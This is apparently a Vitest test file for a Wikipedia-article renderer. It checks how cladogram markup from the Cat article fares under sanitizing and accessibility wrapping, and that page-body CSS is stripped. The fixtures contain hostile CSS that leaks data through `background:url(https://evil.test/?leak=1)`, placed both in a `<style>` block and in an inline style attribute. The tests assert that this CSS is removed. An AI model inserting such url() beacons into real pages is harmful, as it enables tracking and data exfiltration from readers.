import { afterEach, describe, expect, it, vi } from "vitest";
import { fetchFullArticle } from "@/lib/wiki/article";

// Wiki-style-reuse build (spec/design `wiki-style-reuse.md`, AC3 + AC5): faithful
// cladogram rendering by REUSING Wikipedia's own `Template:Clade/styles.css` — ported
// (re-scoped under `.wiki-body`) into our bundle rather than trusting the page-body
// TemplateStyles block. These tests assert (1) the transform leaves the clade DOM the
// ported CSS keys off INTACT after sanitize, (2) the tree gets a contained,
// keyboard-scrollable region, and (3) the X4 guarantee STILL holds for the clade path:
// no page-body `<style>` / inline `style` that arrives inside a cladogram is trusted.
//
// The fixture mirrors the LIVE Parsoid markup of en.wikipedia.org/wiki/Cat: a
// `td.cladogram` (inside a `gallery-element` carrier table) holding a `div.clade` that
// wraps nested `table.clade` trees, each tree drawn by per-cell clade-class borders.
// The real page ships `Template:Clade/styles.css` as a `<style>` block inside an
// `mw-empty-elt` span; we include a hostile variant of that block to prove it is
// stripped (X4) and the styling comes only from our ported, scoped bundle CSS.

function mockArticleHtml(body: string): void {
  vi.spyOn(globalThis, "fetch").mockResolvedValue(
    new Response(`<html><body>${body}</body></html>`, {
      status: 200,
      headers: { "content-type": "text/html" },
    })
  );
}
afterEach(() => vi.restoreAllMocks());

async function fullHtml(body: string): Promise<string> {
  mockArticleHtml(body);
  const a = await fetchFullArticle("Cat");
  return a.lead.leadHtml + "\n" + a.sections.map((s) => s.html).join("\n");
}

// A small cladogram, structurally faithful to the live Cat markup. The page ships the
// clade stylesheet INSIDE an `mw-empty-elt` span as a `<style>` block — included here
// (with a hostile exfil payload) so the X4 test can prove it is stripped, not trusted.
const CLADE = `
<table class="gallery-element"><tbody>
  <tr class="header"><th>nuclear DNA:</th></tr>
  <tr><td class="cladogram">
    <div class="clade">
      <span class="mw-empty-elt"><style data-mw-deduplicate="TemplateStyles:r1" typeof="mw:Extension/templatestyles">.mw-parser-output table.clade td.clade-label{background:url(https://evil.test/?leak=1)}</style></span>
      <table class="clade"><tbody>
        <tr>
          <td class="clade-label first"><a rel="mw:WikiLink" href="./Felidae">Felidae</a></td>
          <td rowspan="2" class="clade-leaf">
            <table class="clade"><tbody>
              <tr>
                <td class="clade-label first"></td>
                <td rowspan="2" class="clade-leaf"><p><a rel="mw:WikiLink" href="./Pantherinae">Pantherinae</a></p></td>
              </tr>
              <tr><td class="clade-slabel"></td></tr>
            </tbody></table>
          </td>
        </tr>
        <tr>
          <td class="clade-label"><i><a rel="mw:WikiLink" href="./Felinae">Felinae</a></i></td>
          <td rowspan="2" class="clade-leaf"><p>other Felinae lineages</p></td>
        </tr>
        <tr><td class="clade-slabel"></td></tr>
      </tbody></table>
    </div>
  </td></tr>
</tbody></table>`;

describe("AC3 — faithful cladograms (clade style reuse)", () => {
  it("keeps the clade DOM (class names the ported CSS keys off survive sanitize)", async () => {
    const out = await fullHtml(`<section><h2>Evolution</h2>${CLADE}</section>`);
    const doc = new DOMParser().parseFromString(out, "text/html");
    // The whole clade-class family the ported stylesheet keys off must survive.
    expect(doc.querySelector("div.clade")).not.toBeNull();
    expect(doc.querySelectorAll("table.clade").length).toBe(2); // outer + nested tree
    expect(doc.querySelector("td.clade-label.first")).not.toBeNull();
    expect(doc.querySelector("td.clade-leaf")).not.toBeNull();
    expect(doc.querySelector("td.clade-slabel")).not.toBeNull();
    // The leaf labels (taxon names) are present and not clipped/stripped.
    expect(out).toContain("Pantherinae");
    expect(out).toContain("Felinae");
    // rowspan (the clade tree's vertical joins) survives via the inert-attr hook.
    expect(out).toContain('rowspan="2"');
  });

  it("makes the outer div.clade a contained, keyboard-scrollable region (design §4)", async () => {
    const out = await fullHtml(`<section><h2>Evolution</h2>${CLADE}</section>`);
    const doc = new DOMParser().parseFromString(out, "text/html");
    const clade = doc.querySelector("div.clade")!;
    expect(clade.classList.contains("wiki-clade")).toBe(true);
    expect(clade.getAttribute("role")).toBe("region");
    expect(clade.getAttribute("tabindex")).toBe("0");
    expect(clade.getAttribute("aria-label")).toBe("Cladogram");
  });

  it("tags the cladogram-host carrier table so it draws no data-table grid, never scroll-wraps the tree", async () => {
    const out = await fullHtml(`<section><h2>Evolution</h2>${CLADE}</section>`);
    const doc = new DOMParser().parseFromString(out, "text/html");
    const carrier = doc.querySelector("table.gallery-element")!;
    expect(carrier).not.toBeNull();
    expect(carrier.classList.contains("wiki-clade-carrier")).toBe(true);
    // The clade tree itself is NOT scroll-wrapped as a data table (it owns div.clade).
    expect(doc.querySelector("table.clade")!.closest(".wiki-tablewrap")).toBeNull();
    // and the carrier is not double-wrapped either.
    expect(carrier.closest(".wiki-tablewrap")).toBeNull();
  });

  it("only the OUTERMOST div.clade becomes the scroll region (no nested region trap)", async () => {
    // (The fixture has one div.clade; this guards the outermost-only rule so a future
    // multi-div tree doesn't nest scroll regions / duplicate the overflow hint.)
    const out = await fullHtml(`<section><h2>Evolution</h2>${CLADE}</section>`);
    const doc = new DOMParser().parseFromString(out, "text/html");
    expect(doc.querySelectorAll(".wiki-clade").length).toBe(1);
  });
});

// ───────────────────── X4 — the clade reuse path admits NO page-body CSS ─────────────────────
// The headline security property of the chosen mechanism: faithful clades come ONLY
// from our ported, scoped bundle stylesheet — NEVER from the `<style>`/inline `style`
// that ships inside the article body. A crafted exfil payload in the clade's own
// TemplateStyles `<style>` (and an inline `style` on a clade cell) must be neutralized.
describe("AC5/X4 — clade styling reuses ONLY trusted bundle CSS, not page-body CSS", () => {
  it("strips the page-body Template:Clade/styles.css <style> block + its exfil url()", async () => {
    const out = await fullHtml(`<section><h2>Evolution</h2>${CLADE}</section>`);
    expect(out.toLowerCase()).not.toContain("<style");
    expect(out).not.toContain("evil.test"); // the background:url() exfil vector is gone
    expect(out).not.toContain("TemplateStyles:r1");
    // The empty placeholder span that held the stripped TemplateStyles ref is removed,
    // not left as a stray inline gap.
    expect(out).not.toContain("mw-empty-elt");
  });

  it("does not trust an inline style attribute smuggled onto a clade cell", async () => {
    const out = await fullHtml(
      `<section><table class="clade"><tbody><tr>` +
        `<td class="clade-label" style="background:url(https://evil.test/?leak=1);position:fixed">x</td>` +
        `<td class="clade-leaf"><p>Leaf</p></td>` +
        `</tr></tbody></table></section>`
    );
    expect(out).not.toMatch(/style=/i); // no inline style survives, even on a clade cell
    expect(out).not.toContain("evil.test");
    expect(out).toContain("clade-label"); // …while the structural class the CSS uses stays
  });
});
